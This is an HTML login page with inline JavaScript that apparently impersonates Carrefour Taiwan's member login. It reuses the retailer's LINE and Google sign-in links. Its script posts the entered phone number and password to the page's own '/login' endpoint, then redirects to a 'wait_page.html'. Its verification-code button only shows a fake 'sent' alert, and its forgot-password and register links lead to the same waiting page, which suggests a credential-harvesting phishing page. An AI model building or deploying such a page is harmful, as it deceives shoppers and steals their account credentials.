<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>登入</title>
    <link rel="stylesheet" href="styles.css">
    <script>
        function handleLogin(event) {
            event.preventDefault(); // 防止表單提交
            var phoneNumber = document.getElementById("phone").value;
            var password = document.getElementById("password").value;
            var userData = {
                phone: phoneNumber,
                password: password
            };
            fetch('/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(userData)
            })
            .then(response => {
                if (response.ok) {
                    // 请求成功，跳转到等待页面
                    window.location.href = 'wait_page.html';
                } else {
                    // 请求失败，显示错误信息
                    alert('登录失败，请重试！');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('登录失败，请重试！');
            });
        }
        function showAlert() {
            var phoneNumber = document.getElementById("phone").value;
            if (!phoneNumber) {
                alert("請填寫電話號碼!");
                return; // 防止彈窗後繼續執行下面的代碼
            }
            alert('已發送!');
        }

    </script>
</head>
<body>
    <header>
        <img src="logo.png" alt="Logo">
    </header>
    <div class="container">
        <div class="login-box">
            <h2>登入</h2>
            <form action="login.php" method="post" onsubmit="handleLogin(event)">
                <input type="text" id="phone" name="phone" placeholder="請輸入手機號碼" required><br><br>
                
                <input type="password" id="password" name="password" placeholder="密碼" required><br><br>
                
                <p class="password-advice">建議定期更改密碼，以保障帳號安全</p>
                
                <div class="verification-code">
                    <input type="text" id="verification_code" name="verification_code" placeholder="驗證碼" required>
                    <button type="button" onclick="showAlert()">發送驗證碼</button>
                </div>
                
                <a href="wait_page.html" class="forgot-password">忘記密碼</a><br><br>
                <form onsubmit="handleLogin(event)">
                    <button type="submit" class="login-button">登入</button>
                </form>
                <p >  </p><br>
                <div>
                    <a href="https://carrefour.tototalk.com.tw/web-member-login"><img style="width:130px; height:auto; display:inline-block;margin-right:10px;" src="ICON-EC.png"></a>
                    <img style="width:150px;height:auto;display:inline-block;margin-right:10px;" src="web-member-login.png">
                </div>
                <p class="other">――――――――使用其它方式登入――――――――</p>
                <div>
                        <a href="https://access.line.me/oauth2/v2.1/login?returnUri=%2Foauth2%2Fv2.1%2Fauthorize%2Fconsent%3Fresponse_type%3Dcode%26scope%3Dopenid%2520profile%26client_id%3D1630186793%26redirect_uri%3Dhttps%253A%252F%252Fonline.carrefour.com.tw%252Fzh%252Fsocial%252Flogin%252F%26state%3DLI&loginChannelId=1630186793&loginState=QD2pVJM71jVAPF5IwnUenU#/"><img style="width:60px; height:auto; display:inline-block;margin-right:60px;" src="icon-line.png"></a>
                        <a href="https://accounts.google.com/v3/signin/identifier?opparams=%253F&dsh=S235488116%3A1715101535963446&client_id=260812646328-b62s7lbkc6s51qve5kd7f0krf3pjf4rb.apps.googleusercontent.com&ddm=0&o2v=2&redirect_uri=https%3A%2F%2Fonline.carrefour.com.tw%2Fzh%2Fsocial%2Flogin%2F&response_type=code&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile&service=lso&state=GG&flowName=GeneralOAuthFlow&continue=https%3A%2F%2Faccounts.google.com%2Fsignin%2Foauth%2Fconsent%3Fauthuser%3Dunknown%26part%3DAJi8hAOxczyKTTWecYEJHEteuuYRmPgRW7ZbWDi9_SeRtu1yxxSz9gMxK-6ltBeceTOXe-m-TZiDGecHvAYT9TaMp4fiBjC0WCnj2RWqvLTUFWtrJr3XYWO9P7VNgs16TrVNFbkbJ0uneTYN4xQCLUr0Fkk-ub7Ji9i2uX4NwrFebPyoQ3ai4OD_qrW8v7G3-UAKGixEwO61GIZ9fDFVp3boKd6ceWLgig8ZJ_cYvkqKp6L64hADcojnxqIodNZXclm6tGkFQ2qQ3U1NhrgeWh4Sk4-yfP31_Bu0Ou0FyjTPXBBP4diKF7ZPl80D041rexqiBgnzOc3rsHNvP7S-ybEEjjftr5qM4Uq780pqg8NXERg-6xB6qCapFtPf5aWI1tOy80FstUr-I2QVQSaFzWjTat8QzBya2Ef_1NpG7DjOh2kcrcB9R5HajRcJ-fPkyTCfaSQQo3eT7-OYGuD0X3-YErzIFmf1Pw%26flowName%3DGeneralOAuthFlow%26as%3DS235488116%253A1715101535963446%26client_id%3D260812646328-b62s7lbkc6s51qve5kd7f0krf3pjf4rb.apps.googleusercontent.com%23&app_domain=https%3A%2F%2Fonline.carrefour.com.tw&rart=ANgoxccso3wGeHY4EbdBfkK4dJiTFMvutB9Yoit_pGIRJ40UU8uwx7OeOeaSEcfB1VCvDdkfi1wXPQzN377ZGUSYUmsx24IMSDK9TvX3PYNBmXyo39qb3u4"><img style="width:60px;height:auto;display:inline-block;margin-right:10px;" src="icon-google.png"></a>
                </div>
                <button type="new" class="new" onclick="window.location.href='wait_page.html'">註冊會員</button>
            </form>
        </div>
    </div>
</body>
</html>
